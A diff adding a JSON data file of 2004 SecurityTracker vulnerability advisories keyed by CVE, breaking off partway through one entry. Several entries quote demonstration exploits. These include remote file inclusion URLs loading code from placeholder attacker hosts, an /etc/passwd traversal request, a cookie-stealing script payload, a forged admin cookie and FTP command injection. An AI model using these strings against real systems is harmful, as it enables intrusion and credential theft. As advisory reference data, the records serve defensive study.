@@ -1,0 +1,755 @@
+{
+  "year": 2004,
+  "total": 68,
+  "reference": "securitytracker.com",
+  "reports": {
+    "CVE-2004-0041": [
+      {
+        "url": "http://www.securitytracker.com/id?1008675",
+        "title": "mod_auth_shadow Apache Module Authenticates Expired Passwords",
+        "body": "A vulnerability was reported in the mod_auth_shadow Apache module. A remote user with previously valid authentication credentials but with an expired password can successfully authenticate.It is reported that the software does not enforce a user's password expiration status. A remote authenticated user with a previously valid password may be able to authenticate successfully even though the password has expired.Debian reported that David B Harris discovered this flaw.",
+        "extra": "A remote user can authenticate with a correct but expired password.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-0067": [
+      {
+        "url": "http://securitytracker.com/id?1018613",
+        "title": "PhpGedView Input Validation Hole in 'login.php' Permits Cross-Site Scripting Attacks",
+        "body": "A vulnerability was reported in PhpGedView. A remote user can conduct cross-site scripting attacks.The 'login.php' script does not properly filter HTML code from user-supplied input in the 'User Name' field before displaying the input. A remote user can cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the PhpGedView software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.Joshua Morin discovered this vulnerability.",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the PhpGedView software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-0220": [
+      {
+        "url": "http://www.securitytracker.com/alerts/2004/Mar/1009468.html",
+        "title": "isakmpd Payload Handling Flaw Lets Remote Users Crash the Daemon",
+        "body": "Some vulnerabilities were reported in the ISAKMP daemon (isakmpd) in the processing of payloads. A remote user can cause the daemon to crash.It is reported that there are flaws in the payload validation and processing functions. A remote user can send specially crafted ISAKMP messages to cause isakmpd to crash or to loop endlessly, the report said. Some memory leaks were also reported.The 'doi.h', 'util.h', 'ipsec.c', 'isakmp_doi.c', and 'message.c' files are affected.Rapid7 released an advisory describing the vulnerabilities in greater detail. The vulnerabilities were detected based on testing with the Rapid7 Striker ISAKMP Protocol Test Suite.A remote user can send a packet with a user-defined length of 0 to cause the target daemon to enter an infinite loop attempting to parse the same payload repeatedly [CVE: CVE-2004-0218].A remote user can reportedly send a specially crafted IPSec security association (SA) packet to cause the daemon to crash [CVE: CVE-2004-0219].A remote user can send a specially crafted ISAKMP Cert Request payload to trigger an integer underflow and a resulting memory allocation failure [CVE: CVE-2004-0220].It is also reported that a remote user can send a specially crafted ISAKMP Delete payload that contains a large number of security protocol identifiers (SPIs) to cause the target daemon to crash [CVE: CVE-2004-0221].Finaly, a remote user can exploit some memory leaks in the processing of isakmpd packets to cause the target daemon to consume all available memory and crash [CVE: CVE-2004-0222].",
+        "extra": "A remote user can cause isakmpd to crash or enter an endless loop.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-0234": [
+      {
+        "url": "http://securitytracker.com/id?1015866",
+        "title": "Barracuda Spam Firewall Buffer Overflows in Processing LHA and ZOO Archives Let Remote Users Execute Arbitrary Code",
+        "body": "Two vulnerabilities were reported in the Barracuda Spam Firewall. A remote user can execute arbitrary code on the target user's system.A remote user can send e-mail with a specially crafted LHA archive containing a long filename to trigger a stack overflow and execute arbitrary code on the target device.A remote user can also send an e-mail with a specially crafted ZOO archive to trigger a stack overflow and execute arbitrary code.The vendor was notified on March 2, 2006.Jean-Sebastien Guay-Leroux discovered this vulnerability. Ulf Harnhammar originally discovered the underlying LHA vulnerability.",
+        "extra": "A remote user can execute arbitrary code on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-0867": [
+      {
+        "url": "http://securitytracker.com/id?1011331",
+        "title": "Firefox Bug in Setting Cookies in Certain Domains May Let Remote Users Conduct Session Fixation Attacks",
+        "body": "A vulnerability was reported in Mozilla Firefox. A remote user may be able to set cookies on certain domains as part of a session fixation attack.Westpoint Security reported that a remote web server can set a cookie on the target user's Firefox browser for certain country specific top-level domains (TLDs) to cause Firefox to send the cookies when connecting to any other web servers in the same domain.This flaw may allow remote users to conduct session fixation attacks to hijack a target user's session. A paper on session fixation attacks is available at:http://www.acros.si/papers/session_fixation.pdfIt is also reported that the browser may send non-secure cookies (i.e., those set via HTTP) to the server via SSL. A remote user with the ability to spoof connections or conduct a man-in-the-middle attack may be able to set a cookie on the target user's browser that will subsequently be sent by the target user's browser to a secure server as part of a session fixation attack.The vendor was notified on July 20, 2004.The original advisory is available at:http://www.westpoint.ltd.uk/advisories/wp-04-0001.txt",
+        "extra": "A remote user may be able to set cookies in certain top-level domains to be sent by the target user's browser when connecting to any server in that domain.A remote user may be able to set cookies via a non-secure server to be sent by the target user's browser to a secure server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-0940": [
+      {
+        "url": "http://securitytracker.com/id?1011783",
+        "title": "Apache mod_include Buffer Overflow Lets Local Users Execute Arbitrary Code",
+        "body": "Crazy Einstein reported a buffer overflow in Apache mod_include. A local user may be able to gain elevated privileges.It is reported that the get_tag() function contains a buffer overflow that can be triggered, for example, from the handle_echo() function. A local user can create specially crafted HTML that, when processed by Apache, will execute arbitrary code with the privileges of the httpd child process.",
+        "extra": "A local user can execute arbitrary code with the privileges of the Apache httpd child process.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1125": [
+      {
+        "url": "http://securitytracker.com/id?1012646",
+        "title": "Xpdf Buffer Overflow in doImage() Lets Remote Users Execute Arbitrary Code",
+        "body": "iDEFENSE reported a buffer overflow vulnerability in Xpdf. A remote user can cause arbitrary code to be executed on the target user's system.It is reported that a remote user can create a specially crafted PDF file that, when viewed by the target user, will trigger an overflow and execute arbitrary code with the privileges of the target user.The flaw resides in the Gfx::doImage() function in 'xpdf/Gfx.cc', where the maskColors array can be overflowed.The vendor was notified on November 23, 2004.The original advisory is available at:http://www.idefense.com/application/poi/display?id=172&type=vulnerabilities",
+        "extra": "A remote user can create a specially crafted PDF file that, when viewed by the target user, will execute arbitrary code on the target user's system. The code will run with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1166": [
+      {
+        "url": "http://securitytracker.com/id?1012444",
+        "title": "Microsoft Internet Explorer Input Validation Error in Processing FTP URLs May Let Remote Users Inject Arbitrary FTP Commands",
+        "body": "A vulnerability was reported in Microsoft Internet Explorer in the processing of FTP URLs. A remote user may be able to cause FTP commands to be executed.A remote user can create a specially crafted FTP URL that, when loaded by the target user, will execute arbitrary FTP commands on the specified FTP server. The commands can be appended to the URL, separated by the string '%0a'. A demonstration exploit URL is of the following format:ftp://ftpuser:ftppass@server/directory%0asomecommand%0aThe target user must first be authenticated against the FTP server for the exploit to work.Albert Puigsech Galicia reported this vulnerability.",
+        "extra": "A remote user can create a URL that, when loaded by the target user, may execute arbitrary FTP commands on the specified FTP server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1193": [
+      {
+        "url": "http://securitytracker.com/id?1012294",
+        "title": "Prevx Home Protection Mechanisms Can Be Disabled By Local Adminsitrative Users",
+        "body": "Tan Chew Keong of SIG^2 reported a vulnerability in Prevx Home. A local user can disable the registry and buffer overflow protection mechanisms.It is reported that a local user with administrative privileges can modify SDT ServiceTable entries by directly writing to '\\device\\physicalmemory' to return the entires to their original settings, thereby disabling the kernel hooks and preventing Prevx Home from performing its protection functions.The vendor was notified on September 6, 2004.The original advisory is available at:http://www.security.org.sg/vuln/prevxhome.html",
+        "extra": "A local administrative user can disable the protection mechanisms.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1386": [
+      {
+        "url": "http://securitytracker.com/id?1012700",
+        "title": "TikiWiki Pictures Feature Lets Remote Users Execute Arbitrary Commands",
+        "body": "A vulnerability was reported in TikiWiki in the uploading of image files. A remote authenticated user can execute arbitrary commands on the target system.The vendor reported that a remote authenticated user with upload privileges can invoke the edit page to upload a PHP script to the 'img/wiki_up' directory instead of an image file. Then, the user can cause the web server to execute the script.",
+        "extra": "A remote authenticated user with upload privileges can execute arbitrary commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1419": [
+      {
+        "url": "http://securitytracker.com/id?1012677",
+        "title": "Zeroboard Input Validation Holes in out_login.php and write.php Let Remote Users Execute Arbitrary Commands",
+        "body": "STG Security reported several vulnerabilities in Zeroboard. A remote user can execute arbitrary commands on the target system. A remote user can also conduct cross-site scripting attacks.It is reported that the 'outlogin.php' script does not properly validate user-supplied input in the '_zb_path' variable if PHP is configured with register_globals set on. A remote user can supply a specially crafted value for the variable to cause the target application to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will execute with the privileges of the target web service.A demonstration exploit URL for PHP version 5 is provided:http://[target]/outlogin.php?_zb_path=ftp://[attacker]/pub/The 'dir' variable in 'write.php' is also affected. A demonstration exploit URL is provided:http://[target]/include/write.php?dir=http://[attacker]/It is also reported that 'check_user_id.php' does not filter HTML code from user-supplied input in the 'user_id' parameter. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Zeroboard software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. A demonstration exploit URL is provided:http://[target]/check_user_id.php?user_id=<script>alert(document.cookie)</script>The vendor was notified on November 20, 2004.Jeremy Bae from STG Security is credited with discovering this flaw.",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Zeroboard software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1423": [
+      {
+        "url": "http://securitytracker.com/id?1017107",
+        "title": "Virtual Law Office Include File Bug in 'phpc_root_path' Parameter Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Virtual Law Office. A remote user can include and execute arbitrary code on the target system.The software does not properly validate user-supplied input in the 'phpc_root_path' parameter. A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.Some demonstration exploit URLs are provided:http://[target]/[script_path]/phpcalendar/includes/calendar.php?phpc_root_path=http://evil_script?http://[target]/[script_path]/phpcalendar/includes/setup.php?phpc_root_path=http://evil_script?xoron reported this vulnerability.[Editor's notes: The vulnerable files are part of the PHP-Calendar package. The underlying vulnerability in the PHP-Calendar files was reported in Alert ID 1012713 (CVE-2004-1423) and was corrected by the PHP-Calendar vendor in version 0.10.1.]",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1444": [
+      {
+        "url": "http://securitytracker.com/id?1010415",
+        "title": "Roundup '@@file' Input Validation Error Discloses Files on the System to Remote Users",
+        "body": "An input validation vulnerability was reported in Roundup. A remote user can traverse the directory and view files on the target system.Vickenty Fesunov reported that a remote user can supply a specially crafted URL using the '/home/@@file/' prefix to view file on the target system.A demonstration exploit request is provided:GET /cit/@@file/../../../../etc/passwd HTTP/1.0The bug report is available at:http://sourceforge.net/tracker/index.php?func=detail&aid=961511&group_id=31577&atid=402788",
+        "extra": "A remote user can view files on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1617": [
+      {
+        "url": "http://securitytracker.com/id?1011809",
+        "title": "Lynx HTML Parsing Errors Let Remote Users Deny Service",
+        "body": "A vulnerability was reported in Lynx in the parsing of HTML. A remote user can create HTML that, when loaded by the target user, will cause the target user's browser to crash.Michal Zalewski reported that certain HTML tag sequences and formatting can cause denial of service conditions.\"Broken HTML\" can trigger a crash.Some demonstration exploit examples are provided at:http://lcamtuf.coredump.cx/mangleme/gallery/",
+        "extra": "A remote user can cause a target user's browser to crash when loading HTML.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1759": [
+      {
+        "url": "http://www.securitytracker.com/id?1008814",
+        "title": "Cisco Personal Assistant Default Configuration on IBM Servers Grants Administrative Access to Remote Users",
+        "body": "A vulnerability was reported in Cisco Personal Assistant (PA) when installed on IBM servers. A remote user can gain administrative access to the system. A remote user can also cause denial of service conditions on the target system.Cisco reported that the default installation of several Cisco voice products on the IBM platform leaves the Director Agent configured in an unsecure state. As a result, a remote user can conduct denial of service attacks or gain administrative access.The report indicates that a remote user can connect to port 14247 and gain administrative access without having to authenticate. Cisco has assigned Cisco Bug ID CSCed33037 to this flaw.A remote user can also conduct a portscan against port 14247 to cause the IBM Director Agent process (twgipc.exe) to consume 100% of the CPU. A reboot is required to return the system to normal operations. Director Agent versions 2.2 and 3.11 are reportedly affected. Cisco has assigned Cisco Bug ID CSCed23357 to this flaw.The following IBM server model numbers are reportedly affected: IBM X330 (8654 or 8674), IBM X340, IBM X342, IBM X345, MCS-7815-1000, MCS-7815I-2.0, MCS-7835I-2.4, and MCS-7835I-3.0. Operating system (OS) versions prior to OS 2000.2.6 on the IBM servers are vulnerable.",
+        "extra": "A remote user can gain administrative access to the application.A remote user can cause the CPU utilization to reach 100%.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1760": [
+      {
+        "url": "http://www.securitytracker.com/id?1008814",
+        "title": "Cisco Personal Assistant Default Configuration on IBM Servers Grants Administrative Access to Remote Users",
+        "body": "A vulnerability was reported in Cisco Personal Assistant (PA) when installed on IBM servers. A remote user can gain administrative access to the system. A remote user can also cause denial of service conditions on the target system.Cisco reported that the default installation of several Cisco voice products on the IBM platform leaves the Director Agent configured in an unsecure state. As a result, a remote user can conduct denial of service attacks or gain administrative access.The report indicates that a remote user can connect to port 14247 and gain administrative access without having to authenticate. Cisco has assigned Cisco Bug ID CSCed33037 to this flaw.A remote user can also conduct a portscan against port 14247 to cause the IBM Director Agent process (twgipc.exe) to consume 100% of the CPU. A reboot is required to return the system to normal operations. Director Agent versions 2.2 and 3.11 are reportedly affected. Cisco has assigned Cisco Bug ID CSCed23357 to this flaw.The following IBM server model numbers are reportedly affected: IBM X330 (8654 or 8674), IBM X340, IBM X342, IBM X345, MCS-7815-1000, MCS-7815I-2.0, MCS-7835I-2.4, and MCS-7835I-3.0. Operating system (OS) versions prior to OS 2000.2.6 on the IBM servers are vulnerable.",
+        "extra": "A remote user can gain administrative access to the application.A remote user can cause the CPU utilization to reach 100%.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1777": [
+      {
+        "url": "http://securitytracker.com/id?1010490",
+        "title": "Skype Error in Processing 'callto://' URLs Lets Remote Users Crash the Application",
+        "body": "A vulnerability was reported in Skype in the processing of 'callto://' URLs. A remote user can cause the target user's application to crash.Hillel Himovich reported that the following URL can trigger the flaw:callto://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/The report indicates that it may be possible to execute arbitrary code, but this was not confirmed.In November 2004, Fabian Becker reported a similar vulnerability in the quick-call field.",
+        "extra": "A remote user can create a URL that, when loaded by the target user, will cause the target user's application to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1848": [
+      {
+        "url": "http://securitytracker.com/id?1009529",
+        "title": "WS_FTP Server REST File Pointer Error Lets Remote Authenticated Users Consume Disk Space",
+        "body": "A denial of service vulnerability was reported in WS_FTP Server. A remote authenticated user with FTP write access can cause the target service to consume all available disk space.Hugh Mann reported that a remote authenticated user can send a REST command with a large value and then send a small file with the STOR command to create a file on the target system of up to 2^64-1 bytes. The report indicates that WS_FTP Server does not properly compute the user-supplied file pointer information.A demonstration exploit is provided in the Source Message.",
+        "extra": "A remote authenticated user with FTP write access can consume all available disk space on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1865": [
+      {
+        "url": "http://securitytracker.com/id?1009564",
+        "title": "bBlog Input Validation Flaw in Blog Name Permits Cross-Site Scripting Attacks",
+        "body": "An input validation vulnerability was reported in bBlog. A remote user can conduct cross-site scripting attacks.penfold reported that the software does not filter HTML code from administrator-supplied input in the blog name. A remote user can create HTML code that, when loaded by an authenticated administrator, will inject specially crafted scripting code into a blog name. Then, when a target user views the blog, the injected arbitrary scripting code will be executed by the target user's browser. The code will originate from the site running the bBlog software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the bBlog software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-1992": [
+      {
+        "url": "http://securitytracker.com/id?1009869",
+        "title": "Serv-U FTP Server LIST '-l:' Buffer Overflow Lets Remote Authenticated Users Crash the FTP Service",
+        "body": "A buffer overflow vulnerability was reported in the Serv-U FTP server in the processing of the LIST '-l:' parameter. A remote authenticated user can cause the FTP service to crash.SecuriTeam reported that a remote authenticated user, including an anonymous user, can supply a specially crafted value for a 'LIST -l:' command of about 134 bytes to trigger a memory access error and cause the FTP service to crash.A demonstration exploit is provided in the Source Message.STORM is credited with discovering this flaw.",
+        "extra": "A remote user can cause the FTP service to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2030": [
+      {
+        "url": "http://securitytracker.com/id?1010259",
+        "title": "Liferay Enterprise Portal Lack of Input Validation Permits Cross-Site Scripting Attacks",
+        "body": "An input validation vulnerability was reported in Liferay Enterprise Portal. A remote user can conduct cross-site scripting attacks.Sandeep Giri reported that the software fails to filter HTML code from user-supplied input in almost all input fields. A remote user can submit specially crafted text so that when a target user views the message, arbitrary scripting code will be executed by the target user's browser. The code will originate from the site running the Liferay Enterprise Portal software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. A demonstration exploit for the message 'subject' field is provided:<script>history.go(-1)</script>The vendor was reportedly notified on January 14, 2004.",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Liferay Enterprise Portal software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2111": [
+      {
+        "url": "http://securitytracker.com/id?1008841",
+        "title": "Serv-U FTP Server 'site chmod' Stack Overflow Lets Remote Users Execute Arbitrary Code",
+        "body": "A stack overflow vulnerability was reported in the Serv-U FTP server. A remote user can gain privileges on the system.It is reported that a remote authenticated user with access to a writable directory can invoke the 'site chmod' command with a specially crafted filename to trigger the overflow and execute arbitrary code on the target system. The code will run with the privileges of the Serv-U process (reportedly to be administrator or system privileges in typically cases).",
+        "extra": "A remote authenticated user can execute arbitrary code with the privileges of the Serv-U process.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2320": [
+      {
+        "url": "http://www.securitytracker.com/alerts/2004/Jan/1008866.html",
+        "title": "WebLogic Server and Express Input Validation Flaw in Processing HTTP TRACE Requests Permits Cross-Site Scripting",
+        "body": "A vulnerability was reported in WebLogic Server and Express. A remote user can cross-site scripting attacks using HTTP TRACE requests.A remote user can create a specially crafted HTTP TRACE request that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the WebLogic software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the WebLogic software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2533": [
+      {
+        "url": "http://securitytracker.com/id?1009086",
+        "title": "Serv-U FTP Server Can Be Crashed By Remote Authenticated Users With a Malformed SITE CHMOD Command",
+        "body": "A vulnerability was reported in the Serv-U FTP Server. A remote authenticated user can cause the FTP service to crash.It is reported that a remote authenticated user can issue a specially crafted SITE CHMOD command to cause the FTP service to terminate.This new flaw is reportedly different than the SITE CHMOD flaw reported in January 2004 in Alert ID 1008841 because the new flaw does not require the remote authenticated user to have write access to any directories.A demonstration exploit is provided:SITE CHMOD 666 \\\\...\\UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU",
+        "extra": "A remote authenticated user can cause the FTP service to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2592": [
+      {
+        "url": "http://securitytracker.com/id?1011979",
+        "title": "Quake II Has Multiple Bugs That Let Remote Users Obtain Information, Deny Service, and Possibly Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in the Quake II server software. A remote user can obtain potentially sensitive information, cause the target service to crash, or potentially execute arbitrary code.Richard Stanway reported that the software fails to properly validate user-supplied input in several fields.The server does not validate the offsets in Configstrings and Baselines to ensure non-negative values. A remote user can specify a negative value to cause the service to crash.A buffer overflow exists in the processing of received packet arguments. A remote user can supply a specially crafted argument to trigger the overflow.On Windows-based servers, a remote user can exploit an input validation flaw in the download command to obtain some files from the system. A demonstration exploit command to retrieve the 'server.cfg' file from the 'mod' directory is provided:download \\/server.cfgIt is also reported that a remote user can specify a specially crafted path for the download command to cause the target service to crash when attempting to open the specified directory. A demonstration exploit is provided:download /maps/It is also reported that a remote user may be able to avoid server bans by sending a specially crafted userinfo string ('ip' value) that is large enough to be truncated when processed by the target mod.A remote user can send an invalid disconnect command and then reconnect to cause the server to allocate a slot that is already in use by another client. This will cause the client state data to be overwritten, which may adversely affect the server.It is reported that some of the above listed flaws may affected the underlying Quake II engine, used by various 3rd party games including Anachronox, Daikatana, Heretic II, Kingpin: Life of Crime, Soldier of Fortune, and Sin.Users of the QuakeSrc.org message boards are credited with reporting some of these flaws.The original advisory is available at:http://secur1ty.net/advisories/001",
+        "extra": "A remote user can obtain potentially sensitive configuration information.A remote user ca cause the target service to crash.A remote user may be able to execute arbitrary code on the target server [however, code execution was not confirmed in the report].",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2596": [
+      {
+        "url": "http://securitytracker.com/id?1011979",
+        "title": "Quake II Has Multiple Bugs That Let Remote Users Obtain Information, Deny Service, and Possibly Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in the Quake II server software. A remote user can obtain potentially sensitive information, cause the target service to crash, or potentially execute arbitrary code.Richard Stanway reported that the software fails to properly validate user-supplied input in several fields.The server does not validate the offsets in Configstrings and Baselines to ensure non-negative values. A remote user can specify a negative value to cause the service to crash.A buffer overflow exists in the processing of received packet arguments. A remote user can supply a specially crafted argument to trigger the overflow.On Windows-based servers, a remote user can exploit an input validation flaw in the download command to obtain some files from the system. A demonstration exploit command to retrieve the 'server.cfg' file from the 'mod' directory is provided:download \\/server.cfgIt is also reported that a remote user can specify a specially crafted path for the download command to cause the target service to crash when attempting to open the specified directory. A demonstration exploit is provided:download /maps/It is also reported that a remote user may be able to avoid server bans by sending a specially crafted userinfo string ('ip' value) that is large enough to be truncated when processed by the target mod.A remote user can send an invalid disconnect command and then reconnect to cause the server to allocate a slot that is already in use by another client. This will cause the client state data to be overwritten, which may adversely affect the server.It is reported that some of the above listed flaws may affected the underlying Quake II engine, used by various 3rd party games including Anachronox, Daikatana, Heretic II, Kingpin: Life of Crime, Soldier of Fortune, and Sin.Users of the QuakeSrc.org message boards are credited with reporting some of these flaws.The original advisory is available at:http://secur1ty.net/advisories/001",
+        "extra": "A remote user can obtain potentially sensitive configuration information.A remote user ca cause the target service to crash.A remote user may be able to execute arbitrary code on the target server [however, code execution was not confirmed in the report].",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2608": [
+      {
+        "url": "http://securitytracker.com/id?1011084",
+        "title": "Smart Guest Book Discloses Database and Administrative Password to Remote Users",
+        "body": "Security .Net Information reported a vulnerability in the Smart Guest Book. A remote user can directly access the news database and view the administrative password.It is reported that a remote user can download the database with the following type of URL:http://[target]/path_of_guestbook/SmartGuestBook.mdbIt is also reported that the database contains the administrator's password in unencrypted form.",
+        "extra": "A remote user can download the database and obtain the administrative password.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2649": [
+      {
+        "url": "http://securitytracker.com/alerts/2004/May/1010117.html",
+        "title": "Eudora Fails to Correctly Display the Status Bar for URLs Containing Many HTML Character Entities",
+        "body": "A vulnerability was reported in Eudora. A remote user can cause the target user's Eudora client to obfuscate portions of URLs in the status bar.Brett Glass reported that a remote user can send an e-mail that includes a link with a large number of HTML character entities (such as encoded space characters '&#32') in the middle of the URL to cause the Eudora client to fail to display the full URL in the status bar. The portion of the URL that trails the inserted character entities will not be displayed in the status bar, the report said.A demonstration exploit URL is provided:<a href=\"http://www.e-gold.com &#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32&#32@egegold.com/\"><span lang=EN-USstyle='mso-ansi-language:EN-US'>http://www.e-gold.com/alert</span></a><br>According to the report, the target user must view the message source to determine the full URL.",
+        "extra": "A remote user can send HTML-based e-mail with an embedded URL in a manner that the target user's Eudora client will not display the full URL in the status bar.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2686": [
+      {
+        "url": "http://securitytracker.com/id?1008833",
+        "title": "Sun Solaris modload() May Grant Root Access to Local Users",
+        "body": "A vulnerability was reported in Sun Solaris. A local user may be able to gain root access on the system.Sun reported an unspecified flaw in modload(). A local user can reportedly load arbitrary kernel modules to potentially gain root access on the system.Dave Aitel of Immunity Research reported that there is a directory traversal flaw in the vfs_getvfssw() kernel function. A local user can reportedly load a user-specified kernel module via the mount() or sysfs() system calls.Solaris 7, 8, and 9 are affected. Sun indicated that Solaris 2.6 was not evaluated to determine if it was affected or not, but Immunity Research indicates that 2.6 is indeed affected.The Immunity advisory is available at:http://www.immunitysec.com/downloads/solaris_kernel_vfs.sxw.pdf",
+        "extra": "A local user may be able to gain root privileges on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2688": [
+      {
+        "url": "http://securitytracker.com/alerts/2004/Apr/1009740.html",
+        "title": "NewsPHP Authentication Flaw Lets Remote Users Gain Administrative Access",
+        "body": "Manuel Lopez reported several vulnerabilities in NewsPHP. A remote user can gain administrative access on the application. A remote authenticated administrator can upload arbitrary files. Cross-site scripting attacks are also possible.It is reported that the software does not properly validate user-supplied cookies to authenticate administrative users. A remote user can reportedly supply the following cookie to gain administrative access:autorized=admin; root=adminA demonstration exploit script is provided in the Source Message.It is also reported that a remote authenticated administrator (or a remote user that has exploited the above described authentication vulnerability) can invoke the File Upload feature to upload arbitrary files instead of video files. The remote user can then load a URL to cause the uploaded file to be executed by the web server with the privileges of the web server.It is also reported that the software does not properly filter HTML code from user-supplied input in the 'cat_id' parameter. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the NewsPHP software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. A demonstration exploit URL is provided:/index.php?cat_id=[XSS]The vendor was reportedly notified on April 3, 2004.",
+        "extra": "A remote user can gain administrative access on the application.A remote authenticated administrator can upload arbitrary files to the target system and execute them with the privileges of the web server.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the NewsPHP software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2689": [
+      {
+        "url": "http://securitytracker.com/alerts/2004/Apr/1009740.html",
+        "title": "NewsPHP Authentication Flaw Lets Remote Users Gain Administrative Access",
